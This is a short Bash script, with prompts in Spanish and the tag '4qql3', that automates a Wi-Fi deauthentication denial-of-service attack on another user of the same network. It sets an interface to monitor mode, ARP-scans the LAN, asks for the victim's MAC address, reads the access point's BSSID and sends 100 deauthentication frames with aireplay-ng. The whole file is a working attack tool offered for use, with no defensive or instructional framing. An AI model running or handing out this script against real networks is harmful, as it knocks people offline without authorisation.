#!/bin/bash
echo "---------------------------------------------------------"
echo "4qql3"
echo "---------------------------------------------------------"
echo ""
echo "Denegar servicio a un usuario de la misma red"
echo ""
echo "Indica tu interface de red:"
ifconfig -s | awk '{print $1}' | grep -v Iface
read interface
echo "Activar interface en modo promiscuo? SI (s) NO (n)"
read resp
if [ "$resp" = "s" ]; then
sudo airmon-ng start $interface
fi
echo ""
echo "Mostrando escaneo ARP"
echo ""
#timeout 10 airodump-ng mon0
arp-scan -I $interface -l | awk '{print $1" "$2}' | grep -v Interface | grep -v Starting | grep -v packets | grep -v Ending
echo ""
echo "Indica la MAC de la victima:"
read Vmac
echo ""
#HmacPrep=$(route -n | awk -F "0.0.0.0" '{print $2}' | tr -d '\n' | awk '{print $1}')
#Hmac=$(arp-scan -I $interface -l | awk '{print $1" "$2}' | grep -v Interface | grep -v Starting | grep -v packets | grep -v Ending | grep $HmacPrep | awk '{print $2}')
Hmac=$(iwlist $interface scanning | grep "Address:" | awk -F 'Address:' '{print $2}' | sed 's/ //g')
echo ""
echo "Iniciando el ataque..."
echo ""
echo "VICTIMA: $Vmac"
echo "BSSID: $Hmac"
aireplay-ng -0 100 -c $Vmac -a $Hmac -D mon0
echo ""
echo "Desea deterner mon0? SI (s) NO (n)"
read resp
if [ "$resp" = "s" ]; then
airmon-ng stop mon0
fi
#Canal=$(iwlist $interface scan | grep Channel | awk 'NR == 1' | awk -F ':' '{print $2}')
